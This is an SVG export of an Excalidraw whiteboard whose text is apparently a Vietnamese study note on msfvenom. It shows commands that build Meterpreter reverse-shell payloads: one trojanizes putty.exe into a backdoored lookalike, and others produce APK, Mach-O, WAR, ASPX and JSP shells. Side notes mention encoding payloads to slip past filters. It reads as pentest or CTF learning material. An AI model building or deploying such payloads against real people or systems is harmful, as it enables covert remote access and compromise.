<path d="M1182.97 6445.31 L1182.56 6444.39 L1182.91 6443.47 L1183.74 6443.14 L1185.70 6443.73 L1187.77 6445.18 L1188.84 6446.37 L1191.03 6449.21 L1192.99 6452.90 L1194.77 6457.72 L1196.19 6462.94 L1197.14 6468.55 L1197.79 6474.15 L1197.85 6482.87 L1197.49 6489.34 L1197.14 6492.70 L1196.13 6499.37 L1194.53 6506.70 L1192.45 6513.75 L1190.32 6520.02 L1187.83 6525.90 L1185.46 6531.25 L1182.91 6536.33 L1180.13 6541.01 L1177.17 6545.31 L1175.62 6547.28 L1170.41 6552.50 L1166.38 6555.54 L1162.83 6557.65 L1159.15 6559.63 L1155.65 6561.41 L1152.45 6562.93 L1149.61 6564.18 L1147.18 6565.37 L1146.17 6565.83 L1144.16 6566.82 L1143.21 6567.22 L1140.43 6568.27 L1139.42 6568.67 L1138.11 6569.07 L1136.99 6569.33 L1135.92 6569.59 L1135.92 6569.59" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1147.95 6552.10 L1146.71 6552.10 L1145.40 6552.90 L1143.33 6554.28 L1141.02 6556.06 L1138.35 6558.31 L1135.92 6560.75 L1133.25 6563.65 L1132.01 6565.17 L1129.52 6568.34 L1127.27 6571.77 L1124.60 6576.59 L1123.48 6579.23 L1122.77 6581.61 L1122.83 6583.39 L1123.65 6584.38 L1125.37 6585.10 L1126.74 6585.30 L1130.00 6585.10 L1134.08 6584.58 L1138.23 6583.78 L1142.02 6582.99 L1142.02 6582.99" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="912.77" y="6596.68" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="912.77" dy="0">đại khái là mã hóa payload</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M231.27 6476.80 L231.03 6484.32 L231.03 6486.90 L230.97 6489.60 L231.03 6494.95 L231.15 6500.22 L231.21 6502.87 L231.45 6508.15 L231.68 6513.23 L231.86 6517.98 L232.10 6522.47 L232.34 6526.62 L232.57 6530.12 L232.81 6533.16 L233.05 6535.87 L233.11 6537.91 L233.28 6539.43 L233.34 6540.62 L233.46 6541.81 L233.46 6541.81" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M817.58 6549.53 L818.17 6548.80 L818.83 6549.40 L819.12 6552.10 L819.18 6555.14 L819.18 6558.44 L819.12 6560.29 L819.12 6564.05 L818.94 6568.14 L818.88 6572.56 L818.88 6576.98 L818.94 6581.41 L819.12 6588.14 L819.36 6592.70 L819.60 6597.05 L819.89 6601.27 L820.25 6605.10 L820.72 6608.80 L820.96 6610.51 L821.43 6613.81 L822.08 6616.92 L822.62 6619.82 L823.51 6622.59 L824.28 6625.30 L825.82 6629.12 L826.94 6631.44 L828.13 6633.61 L829.55 6635.53 L831.15 6637.38 L832.04 6638.17 L834.00 6639.75 L836.19 6641.21 L838.62 6642.52 L841.28 6643.91 L844.31 6645.30 L847.39 6646.75 L852.66 6648.92 L856.40 6650.11 L860.37 6651.04 L864.34 6651.83 L866.35 6652.16 L869.79 6652.56 L873.05 6652.82 L875.83 6652.95 L877.02 6653.02 L878.85 6653.08 L880.28 6653.22 L881.64 6653.08 L882.59 6652.62 L882.59 6652.62" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M882.29 6635.86 L882.47 6634.74 L883.18 6634.08 L884.01 6633.75 L885.14 6634.14 L886.26 6636.19 L886.56 6637.18 L886.97 6639.49 L886.74 6643.51 L885.79 6646.29 L884.19 6649.45 L882.05 6652.49 L879.45 6655.33 L876.60 6657.90 L873.76 6659.88 L870.91 6661.14 L869.55 6661.47 L869.55 6661.47" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="896.87" y="6661.50" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="896.87" dy="0">giúp biến đổi payload , giúp qua mặt filter....?</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M338.36 6978.62 C526.01 6978.65,711.66 6978.53,946.79 6978.75 M338.16 6978.86 C548.55 6977.66,759.67 6978.13,947.45 6978.33 M947.20 6977.87 C945.99 6992.68,945.94 7007.49,948.04 7029.67 M947.60 6978.31 C948.12 6988.93,947.36 6999.01,946.38 7028.44 M946.96 7028.26 C717.71 7028.47,487.62 7029.00,337.58 7028.39 M947.32 7028.94 C754.11 7030.90,560.77 7031.18,338.37 7029.40 M338.81 7030.50 C339.53 7015.15,339.80 6999.87,337.67 6977.91 M339.17 7029.66 C337.80 7013.24,337.50 6998.98,337.87 6979.67" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M566.56 7078.99 L565.79 7078.60 L564.90 7078.07 L562.59 7076.75 L560.75 7075.69 L558.85 7074.70 L556.78 7073.78 L554.65 7072.99 L553.52 7072.59 L551.15 7072.06 L548.66 7071.73 L545.11 7071.73 L542.44 7072.06 L539.83 7072.79 L537.28 7073.71 L534.62 7074.97 L532.01 7076.48 L530.77 7077.47 L528.10 7079.39 L525.97 7081.04 L523.89 7082.89 L522.00 7084.74 L520.40 7086.45 L518.32 7089.22 L517.20 7091.07 L516.31 7092.85 L515.95 7093.71 L515.48 7095.23 L515.18 7096.55 L515.12 7097.74 L515.18 7098.86 L515.54 7099.91 L516.07 7101.37 L517.14 7103.28 L519.03 7105.85 L519.74 7106.65 L521.28 7108.43 L522.88 7110.01 L524.54 7111.60 L526.20 7113.18 L527.86 7114.63 L529.52 7116.08 L531.36 7117.34 L533.31 7118.46 L534.32 7118.92 L536.45 7119.78 L540.07 7120.90 L541.31 7121.17 L545.17 7121.89 L547.77 7122.29 L550.44 7122.68 L553.11 7123.01 L555.89 7123.21 L557.25 7123.41 L559.98 7123.61 L562.77 7123.81 L565.55 7123.94 L568.40 7124.01 L571.36 7123.94 L575.57 7123.87 L578.29 7123.74 L581.02 7123.61 L583.63 7123.48 L584.93 7123.35 L587.48 7123.15 L590.08 7123.01 L592.63 7122.82 L595.18 7122.62 L597.79 7122.35 L600.34 7121.96 L602.88 7121.56 L605.37 7121.04 L607.86 7120.44 L610.17 7119.91 L612.48 7119.32 L613.43 7119.12 L615.39 7118.53 L617.11 7118.07 L618.59 7117.67 L619.89 7117.21 L622.56 7116.28 L623.51 7115.89 L626.47 7114.70 L627.36 7114.37 L628.90 7113.84 L630.14 7113.31 L631.27 7112.78 L632.28 7112.39 L633.34 7112.06 L635.30 7111.47 L636.31 7111.07 L637.14 7110.74 L638.68 7110.21 L639.92 7109.62 L642.65 7108.56 L643.48 7108.17 L644.78 7107.57 L646.03 7106.91 L646.97 7106.38 L647.74 7105.99 L648.81 7105.33 L649.76 7104.80 L650.53 7104.14 L651.36 7103.48 L652.07 7102.95 L652.84 7102.22 L653.97 7101.37 L655.09 7100.31 L656.04 7099.52 L656.75 7098.66 L657.46 7097.94 L658.35 7097.01 L659.06 7096.35 L659.60 7095.62 L660.31 7094.90 L660.84 7094.11 L661.20 7093.25 L661.43 7092.26 L661.37 7091.14 L661.08 7089.95 L660.25 7088.43 L659.00 7086.78 L657.52 7085.13 L655.86 7083.61 L653.97 7082.10 L652.84 7081.30 L650.59 7079.98 L648.16 7078.73 L645.49 7077.61 L642.71 7076.55 L639.80 7075.69 L635.18 7074.57 L632.04 7074.04 L629.02 7073.58 L627.60 7073.38 L624.57 7073.18 L621.73 7072.92 L618.83 7072.79 L616.04 7072.66 L613.08 7072.59 L610.23 7072.59 L607.21 7072.52 L604.19 7072.46 L601.17 7072.20 L598.03 7072.13 L594.94 7072.06 L591.68 7072.06 L588.48 7072.00 L585.05 7072.00 L581.73 7072.06 L578.23 7072.13 L574.62 7072.26 L570.65 7072.46 L566.32 7072.59 L562.05 7072.85 L557.67 7073.05 L553.28 7073.32 L549.31 7073.58 L545.64 7073.71 L542.14 7073.98 L538.71 7074.17 L535.27 7074.50 L533.61 7074.70 L530.29 7075.17 L528.51 7075.36 L528.51 7075.36" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M854.85 7104.34 L855.63 7103.94 L856.75 7103.48 L858.05 7103.28 L859.06 7103.08 L860.43 7103.02 L862.32 7103.02 L865.05 7103.08 L866.47 7103.08 L869.25 7103.28 L872.16 7103.48 L875.06 7103.74 L878.03 7103.94 L882.41 7104.47 L885.43 7104.80 L888.40 7105.06 L891.42 7105.46 L894.26 7105.72 L897.23 7106.05 L898.71 7106.18 L901.79 7106.38 L904.87 7106.45 L907.95 7106.51 L910.97 7106.38 L914.11 7106.25 L917.08 7106.05 L921.34 7105.79 L924.07 7105.59 L926.85 7105.33 L929.58 7105.20 L930.83 7105.06 L933.43 7104.87 L936.16 7104.60 L938.88 7104.34 L941.61 7104.07 L944.28 7103.81 L946.94 7103.48 L949.37 7103.35 L952.51 7103.08 L954.11 7103.08 L955.54 7103.15 L956.90 7103.28 L959.21 7103.54 L960.28 7103.74 L962.05 7104.07 L963.65 7104.27 L965.08 7104.60 L966.91 7104.93 L968.81 7105.26 L970.41 7105.59 L973.08 7106.12 L974.08 7106.45 L975.03 7106.65 L975.98 7106.91 L977.17 7107.24 L978.29 7107.51 L979.36 7107.70 L980.37 7107.97 L981.43 7108.10 L982.68 7108.36 L983.98 7108.56 L984.99 7108.76 L984.99 7108.76" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M784.28 7149.35 L783.57 7149.81 L784.10 7150.47 L785.52 7150.60 L788.84 7150.87 L791.86 7150.93 L795.00 7150.93 L798.38 7150.87 L801.94 7150.80 L806.08 7150.47 L810.47 7150.21 L814.85 7150.01 L819.42 7149.68 L823.92 7149.42 L828.48 7149.22 L833.05 7149.22 L837.37 7149.22 L841.76 7149.22 L846.03 7149.35 L848.10 7149.48 L851.60 7149.81 L855.03 7150.14 L859.77 7150.93 L862.80 7151.60 L865.70 7152.19 L868.37 7152.85 L871.03 7153.51 L873.58 7154.10 L874.77 7154.43 L877.08 7155.02 L878.26 7155.22 L880.16 7155.55 L881.94 7155.82 L883.54 7155.95 L886.32 7156.21 L887.57 7156.28 L889.52 7156.35 L891.54 7156.41 L893.49 7156.35 L895.09 7156.35 L897.88 7156.21 L899.95 7156.02 L901.67 7155.88 L903.21 7155.82 L904.57 7155.62 L905.82 7155.49 L906.94 7155.42 L908.07 7155.35 L909.08 7155.16 L911.80 7154.90 L912.93 7154.83 L914.83 7154.63 L916.43 7154.37 L917.79 7154.23 L918.85 7154.04 L919.92 7153.90 L921.17 7153.71 L922.23 7153.57 L923.24 7153.44 L924.54 7153.18 L925.73 7153.05 L926.91 7152.78 L927.98 7152.58 L928.93 7152.38 L929.94 7152.19 L931.06 7152.05 L932.19 7151.99 L932.19 7151.99" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M974.56 7144.40 L973.67 7144.73 L972.90 7145.12 L973.91 7145.39 L977.58 7145.19 L980.78 7145.06 L984.28 7144.86 L988.25 7144.80 L992.63 7144.73 L997.25 7144.66 L1001.94 7144.66 L1006.80 7144.73 L1011.83 7144.86 L1016.87 7145.06 L1021.97 7145.19 L1026.94 7145.39 L1031.92 7145.52 L1036.60 7145.78 L1041.17 7145.85 L1045.43 7145.98 L1049.46 7146.18 L1053.08 7146.31 L1056.69 7146.31 L1060.01 7146.38 L1063.21 7146.38 L1066.23 7146.51 L1069.14 7146.58 L1070.56 7146.58 L1073.23 7146.64 L1075.77 7146.78 L1077.02 7146.78 L1078.97 7146.91 L1082.35 7147.04 L1083.65 7147.11 L1085.67 7147.30 L1086.80 7147.37 L1088.81 7147.44 L1090.47 7147.57 L1091.89 7147.77 L1093.31 7147.83 L1094.50 7148.03 L1096.93 7148.42 L1098.83 7148.62 L1100.48 7148.82 L1101.91 7149.02 L1103.09 7149.22 L1104.34 7149.35 L1105.34 7149.48 L1106.41 7149.68 L1107.65 7149.81 L1109.02 7150.08 L1110.38 7150.21 L1111.74 7150.41 L1113.17 7150.54 L1114.41 7150.60 L1115.77 7150.74 L1116.90 7150.80 L1117.91 7150.93 L1119.21 7151.00 L1120.45 7151.20 L1121.70 7151.33 L1122.77 7151.53 L1123.83 7151.66 L1124.96 7151.79 L1125.97 7152.05 L1126.91 7152.32 L1126.91 7152.32" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M247.51 7168.36 L248.40 7169.02 L251.00 7170.14 L253.02 7170.87 L255.21 7171.59 L257.46 7172.38 L259.83 7172.98 L262.38 7173.64 L265.11 7174.30 L267.89 7174.76 L270.91 7175.15 L273.94 7175.49 L277.20 7175.62 L280.34 7175.88 L283.42 7176.01 L286.26 7176.21 L287.74 7176.28 L290.35 7176.41 L291.65 7176.61 L293.79 7176.67 L296.10 7176.81 L300.13 7177.07 L302.32 7177.14 L304.93 7177.27 L306.05 7177.40 L308.13 7177.47 L309.85 7177.60 L311.92 7177.80 L313.05 7177.86 L315.06 7178.00 L316.78 7178.12 L318.97 7178.26 L321.11 7178.32 L322.94 7178.52 L324.60 7178.59 L326.14 7178.59 L328.99 7178.52 L331.48 7178.52 L332.66 7178.39 L334.56 7178.32 L336.34 7178.32 L337.76 7178.26 L339.12 7178.19 L340.37 7178.19 L341.49 7178.12 L342.62 7178.00 L345.64 7177.86 L346.77 7177.67 L348.60 7177.53 L350.26 7177.40 L351.68 7177.27 L352.99 7177.20 L354.05 7177.14 L355.18 7177.07 L356.72 7177.00 L358.14 7177.00 L361.82 7177.00 L364.13 7176.87 L365.31 7176.81 L367.27 7176.74 L369.05 7176.61 L370.59 7176.48 L371.89 7176.41 L373.14 7176.41 L374.32 7176.34 L375.80 7176.34 L377.23 7176.28 L380.07 7176.21 L382.44 7176.01 L384.40 7175.95 L386.11 7175.88 L387.71 7175.68 L389.02 7175.62 L390.32 7175.55 L391.45 7175.49 L392.93 7175.49 L394.35 7175.49 L395.71 7175.55 L397.25 7175.55 L399.57 7175.68 L401.70 7175.68 L403.48 7175.82 L404.96 7175.82 L406.26 7175.88 L407.86 7175.88 L409.11 7175.88 L410.41 7175.88 L411.65 7175.95 L412.72 7176.08 L412.72 7176.08" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M232.50 7110.90 C383.49 7110.72,534.36 7110.61,803.22 7111.53 M233.02 7111.28 C364.40 7110.66,495.72 7111.07,803.26 7110.96 M803.90 7111.40 C802.70 7120.98,803.69 7132.52,801.91 7160.53 M801.98 7110.75 C803.43 7129.29,802.74 7145.23,803.10 7158.28 M803.56 7159.33 C581.83 7158.13,361.10 7158.69,233.41 7159.28 M803.21 7158.53 C640.70 7157.30,479.15 7157.02,232.49 7158.43 M232.32 7158.74 C232.85 7151.01,233.38 7139.36,233.88 7112.92 M233.53 7157.86 C233.23 7147.05,232.99 7137.24,233.62 7110.43" stroke="#c2255c" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M477.67 7209.28 L478.91 7209.28 L480.10 7209.48 L481.23 7209.61 L484.31 7210.20 L486.62 7210.67 L488.87 7211.13 L491.06 7211.59 L492.01 7211.85 L493.85 7212.18 L495.39 7212.51 L496.81 7212.64 L498.00 7212.78 L499.18 7212.98 L500.90 7212.98 L502.38 7212.98 L504.22 7212.91 L506.59 7212.58 L508.84 7212.25 L510.68 7211.92 L512.28 7211.79 L513.70 7211.72 L514.94 7211.79 L516.19 7211.85 L517.37 7212.18 L519.57 7212.64 L520.57 7212.91 L523.83 7213.70 L525.20 7213.90 L526.50 7214.10 L527.74 7214.16 L530.83 7213.83 L533.14 7213.44 L535.39 7212.91 L537.52 7212.18 L539.60 7211.32 L541.73 7210.40 L543.80 7209.48 L544.87 7209.08 L547.89 7207.89 L548.84 7207.56 L550.44 7207.17 L551.74 7206.90 L553.11 7206.84 L554.23 7206.90 L555.36 7207.10 L556.37 7207.30 L557.37 7207.56 L559.33 7208.09 L560.93 7208.62 L562.29 7208.88 L563.54 7209.01 L565.25 7208.88 L568.16 7208.16 L570.47 7207.30 L572.96 7206.18 L575.45 7204.99 L578.00 7203.87 L580.37 7202.94 L582.62 7202.28 L583.68 7202.08 L585.46 7201.82 L587.00 7202.08 L589.31 7202.88 L591.09 7203.87 L592.69 7204.92 L593.34 7205.45 L594.65 7206.31 L595.71 7206.97 L596.60 7207.50 L597.49 7207.76 L598.44 7208.02 L599.86 7208.02 L604.13 7207.37 L605.37 7207.10 L607.86 7206.51 L610.47 7205.91 L612.96 7205.38 L615.33 7204.99 L616.45 7204.86 L618.29 7204.86 L619.95 7204.92 L621.85 7205.32 L623.86 7205.91 L626.59 7206.84 L628.01 7207.50 L629.25 7208.02 L630.56 7208.42 L631.74 7208.75 L633.11 7208.82 L634.53 7208.68 L637.61 7207.76 L639.39 7207.10 L639.39 7207.10" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M908.60 7667.04 L908.60 7667.04" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">

<rect x="201.5699827802984" y="7388.393421596434" width="985.4526459009388" height="875.410433775334" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
<foreignObject x="201.5699827802984" y="7388.393421596434" width="985.4526459009388" height="875.410433775334" class="excalidraw-foreign-md">
  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
    <div class="notion-embed-header">
      <div class="notion-embed-header-left">
        <span class="notion-embed-icon">📝</span>
        <span class="notion-embed-title">📘 Chèn payload vào file có sẵn (Template Injection)</span>
      </div>
      <a href="#doc-bb1992cd46195f350c21bc14bc0e9c11a8bbe0c5" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
    </div>
    <div class="notion-embed-body">
      <p>Ok mày, tao giải thích phần này ngắn gọn:</p>
<h3>📘 Chèn payload vào file có sẵn (Template Injection)</h3>
<p>Dùng cờ <code>-x</code> (template) để lấy một file thực thi hợp pháp làm &quot;vỏ bọc&quot;, rồi chèn payload vào trong đó.</p>
<p><strong>Ví dụ:</strong></p>
<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -x /root/templates/putty.exe -f exe -o putty_backdoor.exe
</code></pre>
<ul>
<li>Tạo ra file <code>putty_backdoor.exe</code> nhìn giống PuTTY thật.</li>
<li>Khi nạn nhân chạy, payload âm thầm kết nối về máy mày, còn app gốc có thể vẫn hoạt động (nếu dùng thêm <code>-k</code>).</li>
</ul>
<p><strong>Cờ <code>-k</code> (keep)</strong>: giữ nguyên chức năng của file gốc, payload chạy song song trong thread riêng.</p>
<p><strong>Nhược điểm:</strong></p>
<ul>
<li>Hash file thay đổi → hệ thống kiểm tra toàn vẹn sẽ phát hiện.</li>
<li>Chữ ký số gốc bị hỏng → Windows cảnh báo &quot;publisher could not be verified&quot;.</li>
<li>AV hiện đại soi mẫu file lành tính nhưng có code lạ → dễ bị bắt.</li>
</ul>
<p>➡️ Chủ yếu dùng trong lab/CTF, thực chiến cần thêm kỹ thuật che giấu.</p>
<hr>
<h3>📘 Tạo payload đa nền tảng</h3>
<table>
<thead>
<tr>
<th>Nền tảng</th>
<th>Định dạng</th>
<th>Ví dụ lệnh</th>
<th>Ghi chú</th>
</tr>
</thead>
<tbody><tr>
<td>Android</td>
<td><code>apk</code></td>
<td><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -o evil.apk</code></td>
<td>Không cần <code>-f</code>, máy cần bật cài đặt từ nguồn lạ.</td>
</tr>
<tr>
<td>macOS</td>
<td><code>macho</code></td>
<td><code>msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f macho -o shell.macho</code></td>
<td>Định dạng Mach-O.</td>
</tr>
<tr>
<td>Java (Tomcat...)</td>
<td><code>war</code></td>
<td><code>msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war</code></td>
<td>Triển khai qua Tomcat Manager hoặc upload.</td>
</tr>
<tr>
<td>IIS (.NET)</td>
<td><code>aspx</code></td>
<td><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx</code></td>
<td>Upload lên IIS, truy cập URL để chạy.</td>
</tr>
<tr>
<td>Java web</td>
<td><code>jsp</code></td>
<td><code>msfvenom -p java/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f jsp -o shell.jsp</code></td>
<td>Giống PHP nhưng cho server Java.</td>
</tr>
</tbody></table>
<hr>
<h3>🎯 Nguyên tắc chọn:</h3>
<ol>
<li><strong>OS mục tiêu</strong> → xác định nền tảng payload (<code>windows</code>, <code>linux</code>, <code>android</code>, <code>java</code>, <code>php</code>...).</li>
<li><strong>Cách giao payload</strong> → chọn format: file nhị phân (<code>exe</code>, <code>elf</code>, <code>apk</code>...), web upload (<code>php</code>, <code>aspx</code>, <code>jsp</code>, <code>war</code>...), nhúng code (<code>raw</code>, <code>c</code>, <code>python</code>...).</li>
<li><strong>Môi trường chạy</strong> → nếu có PHP thì dùng PHP, có Java thì dùng WAR/JSP, còn bare OS thì dùng binary.</li>
</ol>
<p>➡️ Cứ theo cây quyết định đó là chọn đúng.</p>

    </div>
  </div>
</foreignObject>

</g>
<g transform="translate(-56.74,-107.24)">
<path d="M593.67 7393.66 L593.67 7393.66" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<text x="127.45" y="7355.59" font-family="'DFVN-excalidraw', 'DFVN Excalifont', Virgil, cursive" font-size="16" fill="#c2255c" text-anchor="start"><tspan x="127.45" dy="0">VI)</tspan></text>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M719.68 7539.37 L719.57 7538.32 L718.97 7537.52 L717.49 7536.33 L716.60 7535.87 L714.53 7535.15 L712.28 7534.82 L709.49 7535.02 L706.41 7536.01 L702.97 7537.72 L699.65 7540.56 L695.09 7546.56 L693.02 7551.58 L692.31 7554.22 L691.77 7558.91 L692.37 7563.53 L694.14 7568.02 L697.11 7572.18 L701.14 7575.41 L706.00 7577.78 L711.51 7579.17 L716.78 7579.50 L722.71 7578.84 L728.45 7577.26 L733.73 7574.75 L738.17 7571.98 L741.61 7568.68 L743.63 7565.05 L744.57 7560.82 L744.63 7556.33 L743.68 7551.85 L741.61 7547.09 L740.25 7544.92 L737.05 7541.02 L733.08 7537.92 L729.11 7535.74 L723.12 7534.16 L719.68 7534.16 L718.08 7534.42 L718.08 7534.42" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M1040.51 7536.27 L1040.87 7535.35 L1040.69 7534.16 L1040.28 7533.23 L1038.80 7530.59 L1037.25 7528.55 L1035.60 7526.37 L1033.52 7524.06 L1031.21 7521.82 L1029.97 7520.82 L1025.82 7517.85 L1022.80 7516.21 L1019.54 7514.75 L1015.92 7513.56 L1012.19 7512.58 L1008.28 7511.98 L1004.13 7511.45 L999.74 7511.19 L997.55 7510.99 L993.17 7510.92 L989.08 7510.86 L984.87 7510.92 L980.48 7511.06 L973.79 7511.32 L969.34 7511.65 L964.72 7512.11 L959.92 7512.64 L957.61 7512.97 L952.87 7513.63 L948.31 7514.42 L943.92 7515.15 L939.71 7516.01 L935.86 7516.73 L932.60 7517.46 L928.10 7518.38 L925.31 7519.11 L923.95 7519.44 L921.40 7520.16 L918.97 7520.89 L916.84 7521.49 L915.95 7521.82 L914.35 7522.28 L913.11 7522.87 L912.04 7523.27 L911.21 7523.73 L910.38 7524.12 L909.67 7524.59 L908.72 7525.31 L907.83 7526.24 L907.18 7526.76 L906.11 7527.69 L905.23 7528.55 L904.40 7529.21 L903.57 7530.13 L902.74 7530.86 L902.03 7531.52 L901.31 7532.24 L900.13 7533.43 L898.77 7534.75 L897.64 7535.68 L896.63 7536.66 L894.85 7538.32 L893.73 7539.24 L892.84 7540.03 L892.13 7540.69 L891.30 7541.42 L890.47 7542.08 L889.70 7542.61 L889.70 7542.61" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M881.11 7523.73 L881.34 7524.92 L881.58 7525.97 L881.70 7527.16 L881.88 7530.86 L881.88 7532.05 L881.70 7534.62 L881.46 7537.19 L881.11 7539.57 L880.93 7540.62 L880.69 7542.34 L880.22 7544.78 L880.04 7546.04 L879.86 7547.23 L880.22 7548.28 L880.99 7549.01 L882.88 7549.60 L885.14 7550.19 L887.39 7550.46 L889.46 7550.79 L891.30 7550.99 L892.96 7550.99 L895.57 7550.72 L898.47 7550.00 L901.61 7548.68 L905.05 7546.76 L907.06 7545.44 L907.06 7545.44" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M251.60 7721.67 L252.96 7721.60 L253.97 7721.40 L255.15 7721.34 L256.51 7721.27 L257.88 7721.27 L259.24 7721.34 L260.43 7721.34 L261.79 7721.40 L263.15 7721.40 L264.28 7721.53 L265.46 7721.60 L266.65 7721.67 L267.83 7721.67 L268.90 7721.80 L270.08 7721.80 L271.27 7721.93 L272.45 7722.00 L273.76 7722.06 L275.00 7722.06 L276.13 7722.13 L277.61 7722.13 L278.74 7722.19 L280.10 7722.33 L281.46 7722.39 L282.77 7722.46 L284.07 7722.52 L285.14 7722.72 L286.56 7722.79 L287.68 7722.92 L289.05 7723.12 L290.05 7723.25 L291.12 7723.45 L292.13 7723.58 L293.55 7723.65 L294.91 7723.71 L296.28 7723.85 L297.70 7723.91 L299.06 7723.91 L300.43 7723.98 L301.67 7723.98 L302.97 7723.98 L304.22 7723.98 L305.46 7723.98 L306.88 7723.98 L308.01 7723.91 L309.20 7723.71 L310.44 7723.58 L311.63 7723.45 L312.87 7723.25 L314.11 7723.12 L315.30 7723.05 L316.37 7722.85 L317.61 7722.79 L318.91 7722.72 L320.04 7722.59 L321.34 7722.52 L322.47 7722.46 L323.77 7722.46 L325.02 7722.52 L326.32 7722.52 L327.51 7722.59 L328.75 7722.72 L330.00 7722.79 L331.42 7722.79 L332.60 7722.85 L333.97 7722.85 L335.39 7722.85 L336.81 7722.79 L338.23 7722.79 L339.60 7722.85 L340.96 7722.92 L342.26 7723.05 L343.27 7723.19 L344.57 7723.25 L345.88 7723.45 L347.24 7723.58 L348.60 7723.71 L350.03 7723.91 L351.15 7723.98 L352.69 7723.98 L353.76 7724.04 L355.12 7724.04 L356.43 7724.04 L357.67 7724.11 L358.97 7724.11 L360.34 7724.04 L361.70 7723.98 L362.71 7723.85 L363.83 7723.71 L364.96 7723.58 L366.14 7723.45 L367.33 7723.25 L368.34 7723.12 L369.64 7722.92 L370.88 7722.79 L372.01 7722.72 L372.01 7722.72" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M209.94 7713.15 L210.23 7714.41 L210.47 7715.59 L211.12 7717.91 L212.07 7721.73 L212.66 7724.37 L213.20 7727.01 L213.67 7729.52 L214.08 7731.76 L214.32 7733.55 L214.38 7734.93 L214.32 7736.65 L214.08 7737.84 L213.49 7738.69 L212.48 7738.56 L212.78 7737.57 L213.79 7737.18 L214.74 7737.44 L215.45 7738.10 L216.81 7739.69 L217.64 7741.66 L218.05 7742.66 L218.77 7744.96 L219.18 7747.41 L219.36 7748.66 L219.48 7753.22 L219.42 7755.00 L219.36 7756.52 L219.36 7757.83 L219.24 7759.02 L219.24 7760.61 L219.83 7763.05 L220.90 7764.90 L222.97 7766.48 L226.53 7767.73 L228.84 7768.13 L231.74 7768.46 L231.74 7768.46" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
<path d="M866.41 7738.17 L867.71 7737.97 L868.96 7737.77 L871.51 7737.51 L872.69 7737.38 L875.24 7737.11 L877.91 7736.78 L880.34 7736.45 L882.83 7736.19 L883.89 7735.99 L885.55 7735.79 L886.91 7735.53 L886.91 7735.53" stroke="#c2255c" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
</g>
<g transform="translate(-56.74,-107.24)">
